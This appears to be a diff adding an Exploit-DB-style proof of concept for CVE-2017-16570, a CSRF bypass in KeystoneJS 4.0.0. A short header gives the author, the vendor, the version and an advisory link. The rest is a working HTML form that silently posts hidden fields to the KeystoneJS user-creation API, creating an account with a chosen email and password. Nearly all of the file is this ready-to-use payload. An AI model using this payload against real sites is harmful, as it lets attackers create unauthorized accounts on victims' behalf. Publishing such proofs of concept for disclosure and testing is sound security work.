@@ -1,0 +1,29 @@
+# Exploit Title: Application wide CSRF Bypass
+# Date: Sep, 2017
+# Exploit Author: Saurabh Banawar
+# Vendor Homepage: http://keystonejs.com/
+# Software Link: https://github.com/keystonejs/keystone
+# Version: 4.0.0
+# Tested on: Windows 8.1
+# CVE : 2017-16570
+
+
+Link: https://vuldb.com/?id.109170
+
+
+Exploit:
+
+<html>
+ <body>
+ <form action="http://127.0.0.1:3000/keystone/api/users/create" method="POST"
+enctype="multipart/form-data">
+ <input type="hidden" name="name&#46;first" value="Saurabh" />
+ <input type="hidden" name="name&#46;last" value="Banawar" />
+ <input type="hidden" name="email"
+value="saurabh&#46;banawar&#64;securelayer7&#46;net" />
+ <input type="hidden" name="password" value="test" />
+ <input type="hidden" name="password&#95;confirm" value="test" />
+ <input type="submit" value="Submit request" />
+ </form>
+ </body>
+</html>
